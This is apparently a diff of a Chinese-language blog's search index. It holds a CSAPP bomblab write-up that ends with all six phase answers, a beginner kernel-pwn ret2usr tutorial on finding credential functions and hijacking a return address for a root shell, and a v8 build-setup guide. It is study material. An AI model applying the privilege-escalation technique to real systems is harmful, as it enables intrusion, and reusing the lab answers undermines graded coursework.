class="line">  40105d:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  401061:	c3                   	retq</span><br></pre></td></tr></table></figure>
+
+<p>这个函数中，得到的消息有，参数必须是两个，其中，第一个不确定，在经过<code>fun4函数</code>后，<code>eax</code>返回值要是0，第二个参数必须是0。</p>
+<p>在<code>fun4</code>之前，<code>edx = 0xe</code>、<code>esi = 0x0</code>、<code>edi = rsp+0x8</code>,是fun4的三个参数</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400fce &lt;func4&gt;:</span><br><span class="line">  400fce:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  400fd2:	89 d0                	mov    %edx,%eax		#eax &#x3D; edx &#x3D; 0xe</span><br><span class="line">  400fd4:	29 f0                	sub    %esi,%eax		#eax &#x3D; eax - esi(0x0)</span><br><span class="line">  400fd6:	89 c1                	mov    %eax,%ecx		#ecx &#x3D; eax</span><br><span class="line">  400fd8:	c1 e9 1f             	shr    $0x1f,%ecx		#ecx左移5位 &#x3D;&gt; ecx &#x3D; 0</span><br><span class="line">  400fdb:	01 c8                	add    %ecx,%eax		#eax &#x3D; eax + ecx</span><br><span class="line">  400fdd:	d1 f8                	sar    %eax				#右移1位	eax &#x3D; 7</span><br><span class="line">  400fdf:	8d 0c 30             	lea    (%rax,%rsi,1),%ecx	#ecx &#x3D; rax + rsi * 1 7</span><br><span class="line">  400fe2:	39 f9                	cmp    %edi,%ecx			#edi(第一个参数)与ecx比较</span><br><span class="line">  400fe4:	7e 0c                	jle    400ff2 &lt;func4+0x24&gt;	#如果edi &lt;&#x3D; ecx</span><br><span class="line">  400fe6:	8d 51 ff             	lea    -0x1(%rcx),%edx		#edi &gt; ecx，edx &#x3D; rcx -1</span><br><span class="line">  400fe9:	e8 e0 ff ff ff       	callq  400fce &lt;func4&gt;		#递归</span><br><span class="line">  400fee:	01 c0                	add    %eax,%eax</span><br><span class="line">  400ff0:	eb 15                	jmp    401007 &lt;func4+0x39&gt;</span><br><span class="line">  400ff2:	b8 00 00 00 00       	mov    $0x0,%eax  		#如果ecx小于等于edi，eax &#x3D; 0</span><br><span class="line">  400ff7:	39 f9                	cmp    %edi,%ecx		#如果edi &gt;&#x3D; ecx#结束</span><br><span class="line">  400ff9:	7d 0c                	jge    401007 &lt;func4+0x39&gt;</span><br><span class="line">  400ffb:	8d 71 01             	lea    0x1(%rcx),%esi			#esi &#x3D; rcx + 1</span><br><span class="line">  400ffe:	e8 cb ff ff ff       	callq  400fce &lt;func4&gt;			#递归</span><br><span class="line">  401003:	8d 44 00 01          	lea    0x1(%rax,%rax,1),%eax	#eax &#x3D; rax + rax + 1</span><br><span class="line">  401007:	48 83 c4 08          	add    $0x8,%rsp				#结束</span><br><span class="line">  40100b:	c3                   	retq</span><br></pre></td></tr></table></figure>
+
+<p>在执行两次判断之前，<code>eax = 7</code>，接下来是将输入的第一个参数和<code>eax</code>，做比较，第一次如果小于等于，则得到想要的<code>eax=0</code>，再一次比较，如果大于等于，就结束了，所以，相等，即可顺利通过，也就是第一个参数是7.</p>
+<p>所以，第四阶段 7 0</p>
+<h3 id="第五阶段"><a href="#第五阶段" class="headerlink" title="第五阶段"></a>第五阶段</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401067:	48 89 fb             	mov    %rdi,%rbx				#rbx &#x3D; rdi(读入的数据)</span><br><span class="line">40106a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax			#rax &#x3D; canary</span><br><span class="line">401071:	00 00 </span><br><span class="line">401073:	48 89 44 24 18       	mov    %rax,0x18(%rsp)			#rsp+0x18 &#x3D; rax &#x3D; canary</span><br><span class="line">401078:	31 c0                	xor    %eax,%eax				#eax &#x3D; 0</span><br><span class="line">40107a:	e8 9c 02 00 00       	callq  40131b &lt;string_length&gt;	#求长度</span><br><span class="line">40107f:	83 f8 06             	cmp    $0x6,%eax				</span><br><span class="line">401082:	74 4e                	je     4010d2 &lt;phase_5+0x70&gt;	#长度必须等于6</span><br></pre></td></tr></table></figure>
+
+<p>要求输入的字符串长度必须是6</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401089:	eb 47                	jmp    4010d2 &lt;phase_5+0x70&gt;	#eax &#x3D; 0</span><br><span class="line">40108b:	0f b6 0c 03          	movzbl (%rbx,%rax,1),%ecx		#ecx &#x3D; rbx + rax × 1</span><br><span class="line">40108f:	88 0c 24             	mov    %cl,(%rsp)				#(rsp) &#x3D; cl(ecx低16位)ecx</span><br><span class="line">401092:	48 8b 14 24          	mov    (%rsp),%rdx				#rdx &#x3D; (rsp) &#x3D; cl(ecx低16位)</span><br><span class="line">401096:	83 e2 0f             	and    $0xf,%edx				#edx &amp; 0xf(只要edx的低四位)</span><br><span class="line">401099:	0f b6 92 b0 24 40 00 	movzbl 0x4024b0(%rdx),%edx		#edx &#x3D; rdx + 0x4024b0</span><br><span class="line">						0x4024b0 &lt;array.3449&gt;:	&quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;</span><br><span class="line">4010a0:	88 54 04 10          	mov    %dl,0x10(%rsp,%rax,1)	#rsp + rax × 1 + 0x10 &#x3D; dl(edx的低4位)</span><br><span class="line">4010a4:	48 83 c0 01          	add    $0x1,%rax				#rax + 1</span><br><span class="line">4010a8:	48 83 f8 06          	cmp    $0x6,%rax				#rax与6比较</span><br><span class="line">4010ac:	75 dd                	jne    40108b &lt;phase_5+0x29&gt;</span><br></pre></td></tr></table></figure>
+
+<p>进行了一顿操作，将<code>rax</code>（偏移从0到6） + <code>rbx</code>（输入的）的低4位，在字符串（<code>&quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;</code>）中找到对应的字符，放入<code>rsp + rax × 1 + 0x10</code>内地址对应的区域，一直放了6个字符</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4010b3:	be 5e 24 40 00       	mov    $0x40245e,%esi			#esi &#x3D; 0x40245e &quot;flyers&quot;</span><br><span class="line"></span><br><span class="line">4010b8:	48 8d 7c 24 10       	lea    0x10(%rsp),%rdi			#rdi &#x3D; (rsp + 0x10)</span><br><span class="line">4010bd:	e8 76 02 00 00       	callq  401338 &lt;strings_not_equal&gt; #rdi和rsi</span><br><span class="line">4010c2:	85 c0                	test   %eax,%eax				</span><br><span class="line">4010c4:	74 13                	je     4010d9 &lt;phase_5+0x77&gt;	#字符串必须一样</span><br></pre></td></tr></table></figure>
+
+<p>然后将那个地址的字符，放入<code>rdi</code>中，进行字符串比较，要求和内存单元<code>0x40245e</code>里面的一样，也就是字符串<code>&quot;flyers&quot;</code></p>
+<p>综上，所以，我们需要的偏移，在对应上面的字符串<code>maduiersnfotvby</code>上找，是9、15、14、5、6、7，也就是我们输入的六个可见字符，他们的低4位需要对应以上数，对应ascii码表，可以区数字部分的，0对应0x30，刚好。</p>
+<p><img src="/2020/07/24/bomblab/image-20200723212445995.png" alt="image-20200723212445995"></p>
+<p>所以，也就是9?&gt;567</p>
+<h3 id="第六阶段"><a href="#第六阶段" class="headerlink" title="第六阶段"></a>第六阶段</h3><p>由于最后一个有点复杂，直接在ida里进行分析</p>
+<p>主要分为五个小节</p>
+<p>第一小节，判断输入数据的合法性</p>
+<p><img src="/2020/07/24/bomblab/image-20200724034848651.png" alt="image-20200724034848651"></p>
+<p>结论：需要输入的数据[1,6]，且两两互不相等</p>
+<p>第二小节，对输入的数据进行小小变换操作</p>
+<p><img src="/2020/07/24/bomblab/image-20200724035019549.png" alt="image-20200724035019549"></p>
+<p>结论：原来输入的数据，变成了<code>7-原数据</code></p>
+<p>第三小节，将node链表根据输入重新排列到新的地方</p>
+<p><img src="/2020/07/24/bomblab/image-20200724035051039.png" alt="image-20200724035051039"></p>
+<p>因为语句<code>v6 = (int *)*((_QWORD *)v6 + 1);</code>中， <code>+1</code>通过转换加的是qword数据，根据下面图可以，<code>+1</code>后便是下一个node的地址。</p>
+<p>因为每次取出输入变换的数据<code>v8</code>，取链上node，一直取，直到走了<code>v8</code>步才停下，赋给了<code>v17..</code>这里的数据</p>
+<p><img src="/2020/07/24/bomblab/image-20200724035203891.png" alt="image-20200724035203891"></p>
+<p>第五小节，判断链上的数据，是否递减排列</p>
+<p><img src="/2020/07/24/bomblab/image-20200724035304948.png" alt="image-20200724035304948"></p>
+<p>node上数据</p>
+<ul>
+<li>1 0x14c</li>
+<li>2 0x0a8</li>
+<li>3 0x39c</li>
+<li>4 0x2b3</li>
+<li>5 0x1dd</li>
+<li>6 0x1bb</li>
+</ul>
+<p>所以，从大到小排列：3 4 5 6 1 2</p>
+<p>7 - 原数据 = 现数据</p>
+<p>原数据 = 7 - 现数据</p>
+<p>结果：4 3 2 1 6 5</p>
+<p>Border relations with Canada have never been better.</p>
+<p>1 2 4 8 16 32</p>
+<p>0 207</p>
+<p>7 0</p>
+<p>9?&gt;567</p>
+<p>4 3 2 1 6 5</p>
+<p><img src="/2020/07/24/bomblab/image-20200724040224131.png" alt="image-20200724040224131"></p>
+]]></content>
+      <tags>
+        <tag>csapp</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>C++知识补充</title>
     <url>/2020/10/10/C++%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/</url>
     <content><![CDATA[<h2 id="后置返回类型"><a href="#后置返回类型" class="headerlink" title="后置返回类型"></a>后置返回类型</h2><blockquote>
@@ -89,6 +335,319 @@
 ]]></content>
       <tags>
         <tag>c++基础</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ret2usr</title>
+    <url>/2020/10/22/ret2usr/</url>
+    <content><![CDATA[<p>适合人群：内核基础为0</p>
+<h2 id="知识学习"><a href="#知识学习" class="headerlink" title="知识学习"></a>知识学习</h2><p>基础知识：</p>
+<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/basic_knowledge-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/basic_knowledge-zh/</a></p>
+<p><a href="https://xz.aliyun.com/t/7625#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/7625#toc-10</a></p>
+<h4 id="copy-from-user"><a href="#copy-from-user" class="headerlink" title="copy_from_user"></a>copy_from_user</h4><p>copy_from_user(void *to, const void __user *from, unsigned long n)</p>
+<p>（1）to：将数据拷贝到<strong>内核地址</strong> </p>
+<p>（2）from：需要拷贝数据的<strong>用户地址</strong></p>
+<p>（3）n：拷贝数据的长度（字节）</p>
+<blockquote>
+<p>也就是将form用户地址中的数据拷贝到to内核地址中去，拷贝长度是n</p>
+</blockquote>
+<h4 id="cpio解压和打包"><a href="#cpio解压和打包" class="headerlink" title="cpio解压和打包"></a>cpio解压和打包</h4><p>解压：cpio -idvm &lt; ../initramfs.cpio<br>打包：find . | cpio -H newc -o &gt; ../initramfs.cpio</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>调试，<code>startvm.sh</code>末尾加上</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-gdb tcp::1234 -S</span><br></pre></td></tr></table></figure>
+
+<p>【注：上一行后面还要加上’ \ ‘，不然的话，远程调试可能端口没开，连不上】</p>
+<p><img src="/2020/10/22/ret2usr/image-20200903111140398.png" alt="image-20200903111140398"></p>
+<h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><h4 id="ret2usr（level1）"><a href="#ret2usr（level1）" class="headerlink" title="ret2usr（level1）"></a>ret2usr（level1）</h4><p>说明：参考<code>Linux Kernel Pwn 初探</code>,主要加上具体的一些细节</p>
+<h5 id="查找prepare-kernel-cred和commit-creds的地址"><a href="#查找prepare-kernel-cred和commit-creds的地址" class="headerlink" title="查找prepare_kernel_cred和commit_creds的地址"></a>查找prepare_kernel_cred和commit_creds的地址</h5><pre><code>$ grep prepare_kernel_cred  /proc/kallsyms 
+$ grep commit_creds  /proc/kallsyms </code></pre><p><img src="/2020/10/22/ret2usr/image-20200903105056015.png" alt="image-20200903105056015"></p>
+<p>但是直接执行，地址都是0x0，需要root权限。</p>
+<p><img src="/2020/10/22/ret2usr/image-20200903105223481.png" alt="image-20200903105223481"></p>
+<p>方法：修改suid</p>
+<p>（1）创建一个文件夹</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mkdir myimage</span><br><span class="line">$ cd myimage</span><br></pre></td></tr></table></figure>
+
+<p>（2）解压initramfs.cpio文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cpio -idvm &lt; ..&#x2F;initramfs.cpio</span><br></pre></td></tr></table></figure>
+
+<p>（3）修改suid</p>
+<p>进入etc/init.d/rcS，将1000修改为0</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">level1&#x2F;myimage$ gedit etc&#x2F;init.d&#x2F;rcS</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/10/22/ret2usr/image-20200903110009863.png" alt="image-20200903110009863"></p>
+<p>（4）重新打包</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">level1&#x2F;myimage$ find . | cpio -H newc -o &gt; ..&#x2F;initramfs.cpio</span><br><span class="line">level1&#x2F;myimage$ cd ..</span><br></pre></td></tr></table></figure>
+
+<p>（5）再次执行两条命令即可</p>
+<p><img src="/2020/10/22/ret2usr/image-20200903110203208.png" alt="image-20200903110203208"></p>
+<p>已经是root权限了</p>
+<p><img src="/2020/10/22/ret2usr/image-20200903110251793.png" alt="image-20200903110251793"></p>
+<p><code>prepare_kernel_cred</code>的地址为<code>0xffffffff810b9d80</code></p>
+<p><code>commit_creds</code>的地址为<code>0xffffffff810b99d0</code></p>
+<blockquote>
+<p>疑问解答：此时已经获得root权限了，不就可以直接cat /flag了？</p>
+<p>实际题目中，不会把真的flag放文件里给你，而是在远程环境了。但是本地的地址和远程的地址是一样的，所以，可以通过这种方法得到本地的用户权限，找到prepare_kernel_cred和commit_creds的地址，但是没有办法直接获得flag。</p>
+</blockquote>
+<h5 id="查找基地址"><a href="#查找基地址" class="headerlink" title="查找基地址"></a>查找基地址</h5><p>以root权限运行，参考上面（修改etc/init.d/rcS）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;home&#x2F;pwn # cat &#x2F;proc&#x2F;modules </span><br><span class="line">baby 16384 0 - Live 0xffffffffc0002000 (POE)</span><br></pre></td></tr></table></figure>
+
+<h5 id="调试内核"><a href="#调试内核" class="headerlink" title="调试内核"></a>调试内核</h5><p>（1）编辑startvm.sh，端口可以修改</p>
+<p>0x7ffd958d7e08</p>
+<p><img src="/2020/10/22/ret2usr/image-20200905004851358.png" alt="image-20200905004851358"></p>
+<p>（2）执行<code>./startvm.sh</code></p>
+<p>（3）打开新窗口，在<code>level1</code>目录下执行<code>gdb exp</code></p>
+<p>（4）远程连接，<code>target remote :1234</code></p>
+<p>（5）下断点（ida里面的地址+基地址），继续执行</p>
+<p><img src="/2020/10/22/ret2usr/image-20200905103517562.png" alt="image-20200905103517562"></p>
+<p><img src="/2020/10/22/ret2usr/image-20200905103116021.png" alt="image-20200905103116021"></p>
+<p>（6）在原来的窗口，执行exp</p>
+<p><img src="/2020/10/22/ret2usr/image-20200905103146690.png" alt="image-20200905103146690"></p>
+<p>（7）接着，就可以正常调试了</p>
+<h5 id="执行exp步骤"><a href="#执行exp步骤" class="headerlink" title="执行exp步骤"></a>执行exp步骤</h5><p>（1）编译exp.c</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ gcc exp.c -o exp -w -static -fPIC</span><br></pre></td></tr></table></figure>
+
+<p>（2）将initramfs.cpio解压到myimage文件夹</p>
+<p>（3）将exp移入myimage文件夹下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp exp myimage&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>（4）重新打包，执行./startvm.sh</p>
+<p>exp已在/目录下了</p>
+<p><img src="/2020/10/22/ret2usr/image-20200903111831663.png" alt="image-20200903111831663"></p>
+<h5 id="疑惑的0x88和0x80"><a href="#疑惑的0x88和0x80" class="headerlink" title="疑惑的0x88和0x80"></a>疑惑的0x88和0x80</h5><p>一开始，说将<code>0x100</code>的用户数据拷贝到内核栈上，高度只有<code>0x88</code>，后面又说实际上缓冲区距离<code>rbp</code>是<code>0x80</code>，有点迷。</p>
+<p>一开始的0x88，指的是初始化的时候。</p>
+<p>但是程序初始化的时候，有个压栈操作，所以少减了一个8</p>
+<p><img src="/2020/10/22/ret2usr/image-20200903112746033.png" alt="image-20200903112746033"></p>
+<h5 id="程序执行流程"><a href="#程序执行流程" class="headerlink" title="程序执行流程"></a>程序执行流程</h5><p>init_module是内核加载模块的时候调用的</p>
+<p>开始的时候（内核加载模块）：调用init_module</p>
+<p>中间的时候：</p>
+<p>我们调用ioctl调用了sub_0函数</p>
+<p>ioctl的参数就是sub_0的参数</p>
+<p><img src="/2020/10/22/ret2usr/image-20200905120014834.png" alt="image-20200905120014834"></p>
+<p><code>return (signed int)copy_from_user(&amp;v4, v2, 256LL);</code></p>
+<p>我们通过buf覆盖栈上的返回地址，执行v2中copy过去的templine函数，获得shell</p>
+<p>结束的时候：cleanup_module</p>
+]]></content>
+      <tags>
+        <tag>kernel pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>v8环境搭建</title>
+    <url>/2020/10/11/v8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>搭个环境而已，花了我n久，哭泣。。。</p>
+<p>这里就讲下自己搭环境的经过，，，</p>
+<hr>
+<p>使用的环境：ubuntu 18.04</p>
+<h2 id="初次尝试：本地"><a href="#初次尝试：本地" class="headerlink" title="初次尝试：本地"></a>初次尝试：本地</h2><h3 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h3><p>主要参考的是这两篇博客：</p>
+<p><a href="https://eternalsakura13.com/2018/05/06/v8/" target="_blank" rel="noopener">https://eternalsakura13.com/2018/05/06/v8/</a></p>
+<p><a href="https://bbs.pediy.com/thread-252812.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-252812.htm</a></p>
+<hr>
+<h3 id="vpn"><a href="#vpn" class="headerlink" title="vpn"></a>vpn</h3><blockquote>
+<p>我的本地代理，开了没用，不知道为什么，本机可以上google，但是虚拟机里怎么都不可以，，，然后，，选择在虚拟机里面使用vpn</p>
+</blockquote>
+<p>这个是我用的：<a href="https://neworld.date/user（简单好用而且不贵）" target="_blank" rel="noopener">https://neworld.date/user（简单好用而且不贵）</a></p>
+<p>linux的教程：<a href="https://support.neworld.date/linux/（不要用自动配置，一次性的，后面出问题了，还是要上手动配置）" target="_blank" rel="noopener">https://support.neworld.date/linux/（不要用自动配置，一次性的，后面出问题了，还是要上手动配置）</a></p>
+<p>别的问题不大，注意的两点是：</p>
+<p>1.要使用的时候，需要在命令前面加上<code>proxychains4</code></p>
+<p>2.选择节点的时候，一定要选择有人的</p>
+<p>3.一定是root账户</p>
+<p>4.在/root目录下</p>
+<p>执行命令 <code>proxychains4 curl myip.ipip.net</code> 。如果显示empty server类似的</p>
+<p>那就重新来一遍（建议：wmware弄个快照，，每次都重新配，心真的很累），，，我当时玄学，学校里的网不行（貌似是因为校园网不能翻外网），连了自己的热点就可以了。</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install binutils python2.7 perl socat git build-essential gdb gdbserver</span><br></pre></td></tr></table></figure>
+
+<h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><h5 id="depot-tools"><a href="#depot-tools" class="headerlink" title="depot_tools"></a>depot_tools</h5><p>这个工具是用来得到v8源码的</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root$ cd ~</span><br><span class="line">(proxychains4 )git clone https:&#x2F;&#x2F;chromium.googlesource.com&#x2F;chromium&#x2F;tools&#x2F;depot_tools.git</span><br><span class="line">echo &#39;export PATH&#x3D;$PATH:&quot;&#x2F;root&#x2F;depot_tools&quot;&#39; &gt;&gt; ~&#x2F;.bashrc</span><br></pre></td></tr></table></figure>
+
+<h5 id="ninja"><a href="#ninja" class="headerlink" title="ninja"></a>ninja</h5><p>这个工具是用来编译v8的</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root$ cd ~</span><br><span class="line">(proxychains4 )git clone https:&#x2F;&#x2F;github.com&#x2F;ninja-build&#x2F;ninja.git</span><br><span class="line">cd ninja &amp;&amp; .&#x2F;configure.py --bootstrap &amp;&amp; cd ..</span><br><span class="line">echo &#39;export PATH&#x3D;$PATH:&quot;&#x2F;root&#x2F;ninja&quot;&#39; &gt;&gt; ~&#x2F;.bashrc</span><br></pre></td></tr></table></figure>
+
+<p>echo两句命令，主要是写入环境变量，后期fetch v8的时候，可能会说找不到fetch命令，可能就是环境变量没了，可以通过vim ~/.bashrc，查看最后面是否有下面这两句话，没有的话，加上</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export PATH&#x3D;$PATH:&quot;&#x2F;root&#x2F;depot_tools&quot;</span><br><span class="line">export PATH&#x3D;$PATH:&quot;&#x2F;root&#x2F;ninja&quot;</span><br><span class="line">bash									&#x2F;&#x2F;载入环境变量</span><br></pre></td></tr></table></figure>
+
+<p>然后就是编译启动，我卡死在了v8，真的很慢，而且最后报错，，，出错，网上看了好多，也没解决，，，TAT</p>
+<p>后面的步骤</p>
+<h4 id="v8编译"><a href="#v8编译" class="headerlink" title="v8编译"></a>v8编译</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ fetch v8 &amp;&amp; cd v8&amp;&amp; gclient sync</span><br><span class="line">$ tools&#x2F;dev&#x2F;v8gen.py x64.debug</span><br><span class="line">$ ninja -C out.gn&#x2F;x64.debug</span><br></pre></td></tr></table></figure>
+
+<h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;out&#x2F;x64.debug&#x2F;d8</span><br><span class="line">$ .&#x2F;out&#x2F;x64.debug&#x2F;shell</span><br></pre></td></tr></table></figure>
+
+<p>初始尝试失败，，搞了好久都没出来，，，，但是网上大部分都是这种方法</p>
+<hr>
+<h2 id="二次尝试"><a href="#二次尝试" class="headerlink" title="二次尝试"></a>二次尝试</h2><h3 id="参考博客："><a href="#参考博客：" class="headerlink" title="参考博客："></a>参考博客：</h3><p><a href="https://eternalsakura13.com/2018/06/26/v8_environment/" target="_blank" rel="noopener">https://eternalsakura13.com/2018/06/26/v8_environment/</a></p>
+<h3 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h3><blockquote>
+<p>sakura为我们提供了第二种方法，我一开始试了下，但是谷歌云搞不来，没有信用卡啥的。但是后来只能尝试这个，所以找了下其他国外的云服务器。</p>
+<p>不需要代理啥的，真是舒服。</p>
+<p>知乎上的这篇给了较好的帮助：<a href="https://zhuanlan.zhihu.com/p/130402190" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/130402190</a></p>
+</blockquote>
+<p>我使用的是狗云，进来，“创建景点云服务器”，我一开始用的10G的硬盘，编译的时候发现太小了，然后只好销毁重来一个（这个只要三个工作日内，支持销毁退款）</p>
+<p>操作系统选择这个：CentOS 7 BBR，ubuntu 18我也用了，但还是出问题了</p>
+<p><img src="/2020/10/11/v8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201010130803778.png" alt="image-20201010130803778"></p>
+<p>然后进入“我的经典云服务器”，启动，用xshell远程连过去</p>
+<p><img src="/2020/10/11/v8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201010131058668.png" alt="image-20201010131058668"></p>
+<h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="fetch源码"><a href="#fetch源码" class="headerlink" title="fetch源码"></a>fetch源码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo yum groupinstall &quot;Development Tools&quot;  </span><br><span class="line">sudo yum install -y git gdb bzip2 wget</span><br><span class="line">cd ~</span><br><span class="line">git clone https:&#x2F;&#x2F;chromium.googlesource.com&#x2F;chromium&#x2F;tools&#x2F;depot_tools.git</span><br><span class="line">export PATH&#x3D;&#96;pwd&#96;&#x2F;depot_tools:&quot;$PATH&quot;</span><br><span class="line">mkdir v8</span><br><span class="line">cd v8</span><br><span class="line">fetch v8</span><br><span class="line">cd ~&#x2F;v8&#x2F;v8</span><br><span class="line">git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598(2019-starctf这道入门题)</span><br><span class="line">gclient sync</span><br><span class="line">.&#x2F;tools&#x2F;dev&#x2F;v8gen.py x64.release(这个真的很慢，要耐心)</span><br><span class="line">ninja -C .&#x2F;out.gn&#x2F;x64.release # Release version</span><br><span class="line">.&#x2F;tools&#x2F;dev&#x2F;v8gen.py x64.debug</span><br><span class="line">ninja -C .&#x2F;out.gn&#x2F;x64.debug # Debug version</span><br></pre></td></tr></table></figure>
+
+<h5 id="release版本和debug版本"><a href="#release版本和debug版本" class="headerlink" title="release版本和debug版本"></a>release版本和debug版本</h5><p>上面的12-15行中，12-13两行下载的是release版本，14-15行下载的是debug版本。release版本可以正常运行，但是有些调试信息不能用，如job命令，执行起来的时候，也会告诉我们，没有调试的符号。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg: loaded 186 commands. Type pwndbg [filter] for a list.</span><br><span class="line">pwndbg: created $rebase, $ida gdb functions (can be used with print&#x2F;break)</span><br><span class="line">Reading symbols from .&#x2F;d8...(no debugging symbols found)...done.</span><br></pre></td></tr></table></figure>
+
+<p>debug就是调试版本，可以输入更多的调试信息。虽然debug看着好，但是，，，后面有点问题，，，两个都下过来就好。</p>
+<p><img src="/2020/10/11/v8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201015161210557.png" alt="image-20201015161210557"></p>
+<p>下过来之后，是这样的。</p>
+<p>我们进入x64.debug就可以调试状态下运行d8。。同理release</p>
+<h4 id="搭建ftp服务器"><a href="#搭建ftp服务器" class="headerlink" title="搭建ftp服务器"></a>搭建ftp服务器</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~</span><br><span class="line">tar -czvf v8.tar v8</span><br><span class="line">sudo yum install vsftpd -y</span><br><span class="line">systemctl start vsftpd.service(在CentOS7和它之前，启动vsftpd服务的指令是 service vsftpd start，之后要使用新指令)</span><br><span class="line">sudo netstat -nltp | grep 21</span><br><span class="line">cp v8.tar &#x2F;var&#x2F;ftp&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>然后，浏览器就可以访问到了，点击下载即可。</p>
+<p><img src="/2020/10/11/v8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201011095616016.png" alt="image-20201011095616016"></p>
+<p>哇哇哇哇，感天动地，终于搞定了。</p>
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>实例程序(test.js)：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> b = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> c = [a, b];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();  <span class="comment">//触发第一次调试</span></span><br><span class="line">%DebugPrint(b);</span><br><span class="line">%SystemBreak();  <span class="comment">//触发第二次调试</span></span><br><span class="line">%DebugPrint(c);</span><br><span class="line">%SystemBreak();  <span class="comment">//触发第三次调试</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="v8的gdb"><a href="#v8的gdb" class="headerlink" title="v8的gdb"></a>v8的gdb</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~&#x2F;v8&#x2F;v8&#x2F;tools</span><br><span class="line">mv gdbinit gdbinit_v8</span><br><span class="line">cp gdbinit_v8 ~&#x2F;.gdbinit_v8</span><br><span class="line">cd ~ </span><br><span class="line">vim .gdbinit</span><br><span class="line">#加入下面内容</span><br><span class="line">source ~&#x2F;.gdbinit_v8</span><br><span class="line">source ~&#x2F;v8&#x2F;v8&#x2F;tools&#x2F;gdb-v8-support.py</span><br></pre></td></tr></table></figure>
+
+<p>命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~&#x2F;v8&#x2F;v8&#x2F;out.gn&#x2F;x64.debug&#x2F;</span><br><span class="line">将test.js放到该目录下</span><br><span class="line">gdb .&#x2F;d8</span><br><span class="line">gdb-peda$ set args --allow-natives-syntax .&#x2F;test.js</span><br><span class="line">gdb-peda$ r</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: &#x2F;home&#x2F;winter&#x2F;v8&#x2F;v8&#x2F;out.gn&#x2F;x64.debug&#x2F;d8 --allow-natives-syntax .&#x2F;test.js</span><br><span class="line">[...]</span><br><span class="line">DebugPrint: 0x3847d864df19: [JSArray]</span><br><span class="line"> - map: 0x27aca0f42d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x33ab2b711111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x3847d864de39 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - 